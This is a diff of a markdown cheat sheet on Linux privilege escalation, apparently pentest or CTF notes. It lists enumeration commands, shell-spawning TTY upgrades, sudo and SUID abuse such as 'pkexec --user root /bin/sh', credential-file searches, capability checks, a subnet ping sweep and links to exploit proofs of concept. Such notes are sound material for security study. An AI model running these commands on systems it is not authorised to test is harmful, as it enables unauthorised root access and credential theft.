@@ -1,6 +1,6 @@
   
-# Enum  
-## Quick Enum
+# Linux Host Enumeration   
+## Quick Enumeration Commands 
     hostname; ip addr;    
     whoami; id   
     uname -r   
@@ -8,22 +8,23 @@
     ls -l /etc/shadow   
     sudo -l  
     ps -aux | grep root 
-    
-    netstat -antp; arp -a 
-    for x in {1 .. 254};do (ping -c 1 l.l.l.$x | grep "bytes from" &); done | cut -d " " 
-    cat /etc/hosts 
+    netstat -antp
 ## Scripts
 run [lse.sh](https://github.com/diego-treitos/linux-smart-enumeration) with increasing run levels, [linpeas.sh](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS), [linenum](https://github.com/rebootuser/LinEnum) 
+## File Transfer 
+    which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null 
 ## Checklists / What to look for
 [gtfobins](https://gtfobins.github.io/) 
-- [ ] Fully functional tty? 
+- [ ] Fully functional TTY? 
 - [ ] su root? (no password, root, password) 
 - [ ] Sudo binaries or exploits? 
 - [ ] Exploitable cronjobs?
 - [ ] Weird SUID/SGID binaries?   
 - [ ] Services running as root?, services only available to localhost?
 - [ ] Passwords / config files?  
-- [ ] Is the kernel vulnerable? (last resort) 
+- [ ] Binaries with exploitable capabilities? 
+- [ ] Is the kernel vulnerable? (last resort priv esc) 
+- [ ] Further access into the network? 
 
 [g0tm1lk checklist](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/) 
 [Linux Priv Esc Checklist](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)  
@@ -31,10 +32,13 @@ run [lse.sh](https://github.com/diego-treitos/linux-smart-enumeration) with incr
 
 # Exploits
 ## Upgrade to a fully functional TTY 
+### Check 
+    if [ -t 1 ] ; then echo terminal; else echo "not a terminal"; fi 
+### Upgrade 
     python -c 'import pty;pty.spawn("/bin/bash")' 
     echo os.system('/bin/bash') 
     /bin/sh -i 
-    /bin/bash -p 
+    [Gaining TTY](https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/privilege-escalation/linux/gaining-tty.rst) 
 ## Sudo exploits 
 sudo -l, cat /etc/sudoers, check gtfobins 
 sudo -V 
@@ -64,7 +68,7 @@ sudo su root, type password, see ******: passwd feedback enabled
 [proof of concept](https://github.com/stong/CVE-2021-3156) 
 
 ## Cronjobs    
-look for scripts you can write to running as a cronjob, writeable PATH directories used, wildcard expansion
+look for scripts you can write to running as a cronjob, writeable cron directory/crontab, writeable PATH directories used, wildcard expansion 
 
     cat /etc/crontab  
     crontab -l    
@@ -117,7 +121,8 @@ set PATH variable to current directory and run suid binary
     PATH=.:$PATH /usr/local/bin/suid-env
 
 ### Misc SUID binaries 
-    pkexec --user root /bin/sh 
+    pkexec --user root /bin/sh  
+    use binary to exec /bin/bash -p 
 ## Services Running as Root / Services Only Running Locally
     ps -aux | grep root 
     netstat -etulp 
@@ -127,16 +132,23 @@ set PATH variable to current directory and run suid binary
     find . -type f -exec grep -i -I "PASSWORD=" {} /dev/null \; 
     /etc/passwd, /etc/shadow, /etc/sudoers  read or write?? 
     cat ~/.ssh  
+## Capabilities 
+check gtfobins, [capabilities reference](https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities) 
+    getcap -r / 2>/dev/null  
+    
 ## Kernel Exploits 
     uname -a  
     cat /etc/*-release
 No compilers on host: use gcc-multilib -m32 (32 bit OS) or -m64 (64 bit OS) then upload 
-# File Transfer 
-    which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null 
-    
+## Further Access into a Network 
+    netstat -antp; arp -a 
+    for x in {1 .. 254};do (ping -c 1 l.l.l.$x | grep "bytes from" &); done | cut -d " " 
+    cat /etc/hosts  
+# Resources 
+## Learn More 
+[Hacktricks Linux Privilige Escalation](https://book.hacktricks.xyz/linux-unix/privilege-escalation) 
+[Local Priv Esc workshop](https://github.com/sagishahar/lpeworkshop) 
+[A Guide to Linux Privilige Escalation](https://payatu.com/guide-linux-privilege-escalation) ) 
+https://guif.re/linuxeop
+https://zweilosec.gitbook.io/hackers-rest/linux-1/linux-redteam/enumeration
 
-# Resources
-## Cheat Sheets 
-[g0tmi1k Linux Priv Esc Checklist](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)  
-
-## Learn More
